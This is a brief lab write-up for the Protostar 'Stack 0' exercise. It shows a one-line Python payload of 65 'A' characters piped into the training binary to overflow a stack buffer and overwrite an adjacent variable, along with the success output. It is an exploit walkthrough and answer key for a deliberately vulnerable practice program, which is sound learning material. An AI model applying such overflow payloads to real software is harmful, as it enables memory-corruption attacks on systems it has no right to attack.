# Stack 0
Here is the code for cracking the program

Exploit python 3 code (stack0.py)
```python3
print("A"*65)
```

Terminal command

```shell
python3 stack0.py | /opt/protostar/bin/stack0
```

Output

```shell
you have changed the 'modified' variable
```
This is a simple buffer overflow that overwrites an integer variable.
